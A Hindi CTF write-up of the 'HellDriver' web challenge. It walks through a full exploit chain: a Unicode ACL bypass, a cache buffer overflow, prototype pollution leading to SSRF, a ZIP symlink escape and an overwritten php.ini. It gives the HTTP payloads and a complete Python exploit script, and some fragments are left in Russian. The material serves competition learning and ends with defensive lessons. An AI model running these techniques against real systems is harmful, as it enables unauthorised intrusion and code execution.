# HellDriver

> **श्रेणी:** Web · **इवेंट:** KubSTU CTF 2026 Autumn · **1000 pts** · **दिनांक:** 11 अक्टूबर 2026
> कार्य के लेखक: [@thxStuck](https://t.me/thankspIuxury) · Infrastructure Administrator: [@ZloyTapochek](https://t.me/ddsddmitriy)
> टीम **GR3B0M4** का सामुदायिक (उपयोगकर्ता) राइटअप · स्रोत: https://ctftime.org/writeup/41136 (CTFtime)

## 📌 कार्य

1000 अंकों का एक Web कार्य। एप्लिकेशन कई प्रॉक्सी किए गए सर्विसों से बना है: बाहरी परिधि पर Caddy, आंतरिक Vault-मेथड्स वाला FastAPI बैकएंड, AetherCache नामक एक कस्टम C-कैश, और एक PHP ImageProxy। फ़्लैग केवल तभी पढ़ा जा सकता है जब छह स्वतंत्र कमज़ोरियों को एक ही एक्सप्लॉइट-शृंखला में जोड़ा जाए।

## 🏁 समाधान

### TL;DR

HellDriver में छह छोटी-छोटी भेद्यताओं को एक शृंखला में जोड़ना था: Unicode-नॉर्मलाइज़ेशन की असंगति के ज़रिए ACL बायपास करना, AetherCache में एक key बफ़र को ओवरफ़्लो करना, एक cache-entry को भरोसेमंद मेटाडेटा में बदलना, prototype को प्रदूषित करके SSRF हासिल करना, एक symlink के ज़रिए निष्कर्षण (extraction) डायरेक्टरी के बाहर एक ZIP को रीस्टोर करना, और एक कस्टम `php.ini` के ज़रिए PHP sandbox को कमज़ोर करना।

अंतिम शृंखला इस तरह दिखी:

```text
Caddy ACL bypass
  → update_meta
  → AetherCache flags = 1
  → prototype pollution
  → SSRF во внутренний restore
  → ZIP symlink escape
  → перезапись php-overrides.ini
  → action=readflag
```

### टोह (Reconnaissance)

एप्लिकेशन कई प्रॉक्सी किए गए सर्विसों से बना था: बाहरी परिधि पर Caddy, आंतरिक Vault-मेथड्स वाला FastAPI, एक कस्टम C-कैश AetherCache और एक PHP ImageProxy। अंतिम शृंखला के लिए निम्नलिखित बिंदु ज़रूरी थे:

| मेथड | Endpoint | उद्देश्य |
|---|---|---|
| `POST` | `/api/register` | एक tenant-सेशन बनाना |
| `PUT` | `/api/internal/vault/update_meta` | AetherCache में metadata लिखना; ACL द्वारा बंद |
| `GET` | `/market?meta=...` | कैश से एक कच्ची metadata-प्रविष्टि पढ़ना |
| `POST` | `/api/vault/upload` | भावी ZIP अपलोड करना |
| `GET` | `/imageproxy/api?action=...` | tenant sandbox में PHP चलाना |

`robots.txt` सुरक्षित एंडपॉइंट `update_meta` का नाम उजागर कर देता था। उस तक एक सामान्य अनुरोध लगातार Caddy `403` पाता; एक अस्तित्वहीन FastAPI-रूट एक JSON `404` लौटाता। इससे edge की रुकावट को upstream की प्रतिक्रिया से स्पष्ट रूप से अलग करना और पथ-नॉर्मलाइज़ेशन के विकल्पों की जाँच करना संभव हुआ।

### 1. ACL बायपास और AetherCache ओवरफ़्लो

सुरक्षित एंडपॉइंट इस पते पर मौजूद था:

```http
PUT /api/internal/vault/update_meta
```

सामान्य पथ पर Caddy `403 Forbidden` लौटाता। पर edge और upstream Unicode को अलग-अलग तरीके से नॉर्मलाइज़ करते थे। अगर `internal` में पहली `i` को dotless i `ı` (`U+0131`) से बदल दिया जाए, तो अनुरोध ACL से बच निकलता, और backend फिर भी सही हैंडलर चुन लेता:

```http
PUT /api/%C4%B1nternal/vault/update_meta
Content-Type: application/json
Cookie: __Host-AV=...

{}
```

प्रतिक्रिया `200 {"ok":true}` ने पूर्ण bypass की पुष्टि की: यह `403 → 404` वाला संक्रमण नहीं था, बल्कि एक मौजूदा `PUT` endpoint पर हिट था।

`update_meta` डेटा को `meta:<symbol>` कुंजी के तहत संग्रहीत करता था। `symbol` फ़ील्ड एक निश्चित C-बफ़र में जाती थी, और 256वें वर्ण से आगे के बाइट्स 32-बिट `flags` फ़ील्ड को ओवरराइट कर देते थे:

```text
symbol length 255 → flags = 0
symbol length 256, последний байт "A" → flags = 65
symbol = "E" * 255 + "\x01" → flags = 1
```

कैश की कुंजी 255 बाइट्स तक सीमित थी। चूँकि `meta:` उपसर्ग पाँच बाइट लेता है, ओवरफ़्लो हुई प्रविष्टि को उसके पहले 250 वर्णों से पढ़ना पड़ता था:

```http
GET /market?meta=EEEE...EEEE   # ровно 250 символов
```

`flags=1` होने पर Market cache-entry को संभालने की असुरक्षित शाखा (`card-trade-unsafe`) चुनता था।

### 2. Prototype pollution SSRF में बदल जाता है

सबसे अहम ब्योरा `value` फ़ील्ड था: यह एक नेस्टेड JSON-ऑब्जेक्ट नहीं, बल्कि एक **JSON-स्ट्रिंग** होनी चाहिए। काम करने वाला मान इस तरह दिखता था:

```json
{
  "__proto__": {"allowLocalFetch": true},
  "zipPath": "/srv/<tid>/uploads/<uuid>"
}
```

cache-entry को ज़हरीला बनाने वाला पूरा अनुरोध:

```python
meta = "E" * 250
symbol = meta + "E" * 5 + "\x01"
value = json.dumps({
    "__proto__": {"allowLocalFetch": True},
    "zipPath": f"/srv/{tid}/uploads/{stored_as}",
})

session.put(
    BASE + "/api/%C4%B1nternal/vault/update_meta",
    json={"symbol": symbol, "value": value},
)
```

`/market?meta=<250-byte-prefix>` के ज़रिए पढ़ने के बाद एप्लिकेशन भरोसेमंद मान को पार्स करता और उसे असुरक्षित तरीके से कॉन्फ़िगरेशन के साथ मिला देता था। config में अपना कोई `allowLocalFetch` कुंजी नहीं थी, इसलिए लुकअप प्रदूषित prototype में गिर जाता था। सामान्य `zipPath` कुंजी आंतरिक restore-अनुरोध के लिए पथ तय करती थी।

पहले इसे एक अस्तित्वहीन फ़ाइल से सहूलियत से जाँचा गया:

```json
{
  "status": 404,
  "body": "{\"detail\":\"zip not found\"}"
}
```

यानी SSRF पहले से ही काम कर रहा था और आंतरिक रीस्टोर-सर्विस तक पहुँच रहा था।

### 3. ZIP symlink escape और PHP sandbox से बाहर निकलना

Vault एक ZIP को MIME-टाइप `text/plain` के तहत स्वीकार करता और एक यादृच्छिक नाम लौटाता था:

```json
{"ok":true,"stored_as":"c06666494b504532af55b3005aca0abf"}
```

सीधा Zip Slip ब्लॉक हो जाता था:

```json
{"detail":"unsafe entry: ../php-overrides.ini"}
```

लेकिन extractor आर्काइव के भीतर एक Unix symlink पर भरोसा करता था। Restore फ़ाइलों को `/srv/<tid>/unzip` में निकालता था, इसलिए आर्काइव `escape → ..` लिंक बनाता, और अगली प्रविष्टि उसके ज़रिए होकर tenant sandbox के रूट में चली जाती:

```text
archive.zip
├── escape -> ..
└── escape/php-overrides.ini
```

`php-overrides.ini` की सामग्री प्रतिबंधों को साफ़ कर देती:

```ini
open_basedir=
disable_functions=
```

निष्कर्षण के बाद फ़ाइल `/srv/<tid>/php-overrides.ini` पथ पर पहुँच जाती। ImageProxy हर अनुरोध को इस तरह चलाता था:

```text
php -c /srv/<tid>/php-overrides.ini -f /app/imagesvc/index.php
```

इसलिए अगला अनुरोध PHP को पहले से ही `disable_functions` के बिना शुरू करता। `readflag` क्रिया `/readflag` को कॉल करती और रहस्य लौटा देती:

```http
GET /imageproxy/api?action=readflag
```

```json
{"ok":true,"flag":"kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}"}
```

### पूरा एक्सप्लॉइट

```python
#!/usr/bin/env python3
import io
import json
import re
import stat
import zipfile

import requests

BASE = "https://159.194.249.254:8443"
UPDATE_META = "/api/%C4%B1nternal/vault/update_meta"

requests.packages.urllib3.disable_warnings()
s = requests.Session()
s.verify = False

# Register a tenant.
s.post(BASE + "/api/register", allow_redirects=False).raise_for_status()
tid = s.cookies.get("__Host-AV").split(".", 1)[0]

# Build the symlink archive.
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
    link = zipfile.ZipInfo("escape")
    link.create_system = 3
    link.external_attr = (stat.S_IFLNK | 0o777) << 16
    zf.writestr(link, "..")
    zf.writestr("escape/php-overrides.ini", "open_basedir=\ndisable_functions=\n")

# Upload it as an ordinary Vault document.
r = s.post(
    BASE + "/api/vault/upload",
    files={"file": ("restore.txt", buf.getvalue(), "text/plain")},
)
r.raise_for_status()
stored_as = r.json()["stored_as"]

# Overflow cache flags and inject the trusted metadata value.
meta = "E" * 250
symbol = meta + "E" * 5 + "\x01"
value = json.dumps({
    "__proto__": {"allowLocalFetch": True},
    "zipPath": f"/srv/{tid}/uploads/{stored_as}",
})
r = s.put(
    BASE + UPDATE_META,
    json={"symbol": symbol, "value": value},
)
r.raise_for_status()

# Reading the poisoned entry triggers the internal restore.
r = s.get(BASE + "/market", params={"meta": meta}, timeout=20)
r.raise_for_status()
assert "extracted" in r.text

# The overwritten ini enables the final command execution sink.
r = s.get(BASE + "/imageproxy/api", params={"action": "readflag"})
r.raise_for_status()
print(re.search(r"kubstu\{[^}]+\}", r.text).group(0))
```

आउटपुट:

```text
kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}
```

### क्या महत्वपूर्ण था

- `403 → 404` का संक्रमण अभी ACL bypass सिद्ध नहीं करता; एक सफल bypass को किसी असली upstream handler तक पहुँचना चाहिए।
- भाषा-सीमा पर केवल स्ट्रिंग की लंबाई नहीं, बल्कि किसी संरचना के फ़ील्ड्स की भौतिक स्थिति जाँचना ज़रूरी है। `symbol[255]` के बाद एक बाइट ने cache-entry की सिमैंटिक्स पूरी तरह बदल दी।
- एक JSON-ऑब्जेक्ट और JSON वाली एक स्ट्रिंग यहाँ मूलभूत रूप से अलग थे: prototype pollution केवल `value` के दूसरे पार्स के बाद ही सक्रिय होता था।
- symlink की सुरक्षित हैंडलिंग के बिना ZIP-प्रविष्टियों के नाम जाँचना निष्कर्षण डायरेक्टरी से बाहर निकलने को नहीं रोकता।
- एक कस्टम `php.ini` एक पूर्ण सुरक्षा-सीमा है: उसे ओवरराइट कर पाना `open_basedir` और `disable_functions` हटा देने के बराबर है।

**फ्लैग:** `kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}`
